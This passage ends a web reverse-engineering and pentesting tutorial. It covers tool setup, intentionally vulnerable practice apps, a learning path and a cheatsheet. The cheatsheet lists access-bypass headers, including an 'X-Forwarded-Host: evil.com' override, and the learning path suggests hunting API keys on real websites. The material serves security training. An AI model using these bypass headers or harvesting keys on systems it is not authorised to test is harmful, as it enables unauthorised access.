Wappalyzer         → Detect frameworks, CMS, servers used
HackTools          → Quick access to payloads and tools
EditThisCookie     → Edit cookies easily
ModHeader          → Add/modify request headers
FoxyProxy          → Quickly switch between proxies
uBlock Origin      → Block noise, focus on important requests
```

### Installation

```bash
# Python tools
pip install mitmproxy requests beautifulsoup4 \
            httpx aiohttp jwt

# CLI tools
sudo apt install -y sqlmap nikto curl wget
go install github.com/ffuf/ffuf/v2@latest
go install github.com/OJ/gobuster/v3@latest

# Node tools
npm install -g retire     # Check for vulnerable JS libraries

# Burp Suite
# Download from https://portswigger.net/burp/communitydownload
```

---

## 13. Practice Platforms

### Free Vulnerable Apps to Practice On

**Run locally (safe, intentionally vulnerable):**

| App         | What It Teaches      | How to Run                                       |
| ----------- | -------------------- | ------------------------------------------------ |
| DVWA        | All basic web vulns  | `docker run -p 80:80 vulnerables/web-dvwa`       |
| WebGoat     | OWASP Top 10         | `docker run -p 8080:8080 webgoat/webgoat-8.0`    |
| Juice Shop  | Modern web app vulns | `docker run -p 3000:3000 bkimminich/juice-shop`  |
| HackMe Bank | Banking app vulns    | `docker run -p 10000:10000 appsecco/hackme-bank` |

**Online platforms:**

| Platform                | URL                          | Notes                                                          |
| ----------------------- | ---------------------------- | -------------------------------------------------------------- |
| PortSwigger Web Academy | portswigger.net/web-security | **Best free web security course!** Made by Burp Suite creators |
| HackTheBox              | hackthebox.com               | Web challenges + machines                                      |
| TryHackMe               | tryhackme.com                | Guided paths for beginners                                     |
| PentesterLab            | pentesterlab.com             | Web-focused, great explanations                                |
| OWASP WebGoat           | webgoat.org                  | Official OWASP training app                                    |

### Suggested Learning Path

```
Week 1-2: DevTools Mastery
  → Spend 2 hours exploring DevTools on real sites
  → Find API calls on apps you use every day
  → Read every header and understand it

Week 3-4: Burp Suite Basics
  → Set up Burp, intercept traffic
  → Complete PortSwigger "Getting Started" module
  → Solve first 5 PortSwigger SQL injection labs

Week 5-6: JavaScript RE
  → Deobfuscate JS on deobfuscate.io
  → Find API keys hidden in real websites
  → Hook fetch() on a site, log all API calls

Week 7-8: API RE
  → Install Juice Shop locally
  → Find all API endpoints manually
  → Test for IDOR in Juice Shop

Month 3+: Vulnerabilities
  → Complete PortSwigger Web Academy (free, excellent!)
  → Do HackTheBox web challenges
  → Try bug bounty hunting on HackerOne
```

---

## Quick Reference Cheatsheet

### DevTools Shortcuts

```
F12 / Ctrl+Shift+I   Open DevTools
Ctrl+Shift+F         Search all JS files
Ctrl+P               Quick open file
Ctrl+Shift+E         Clear network log
{ }                  Pretty print JS
F8                   Resume execution (when paused)
F10                  Step over
F11                  Step into
```

### Common HTTP Headers to Look For

```
Authorization: Bearer <jwt>          → Auth token
X-API-Key: <key>                     → API key
Cookie: session=<id>                 → Session
X-CSRF-Token: <token>                → CSRF token (needed for POST)
X-Forwarded-For: 127.0.0.1          → IP override (try for bypasses)
X-Original-URL: /admin               → URL override
X-Forwarded-Host: evil.com           → Host override
```

### Quick Python Request Template

```python
import requests

s = requests.Session()
s.headers.update({
    'User-Agent': 'Mozilla/5.0',
    'Authorization': 'Bearer YOUR_TOKEN',
    'Content-Type': 'application/json'
})

# GET
r = s.get('https://api.example.com/endpoint')
print(r.status_code, r.json())

# POST
r = s.post('https://api.example.com/endpoint',
            json={'key': 'value'})
print(r.status_code, r.json())
```

### JWT Quick Decode

```javascript
// Paste in browser console:
var token = 'YOUR.JWT.TOKEN'
var [h, p] = token.split('.')
console.log(JSON.parse(atob(h))) // Header
console.log(JSON.parse(atob(p))) // Payload
```

---

_Part of the Complete Reverse Engineering Series_
_Next: Mobile RE → Network RE → Firmware RE_
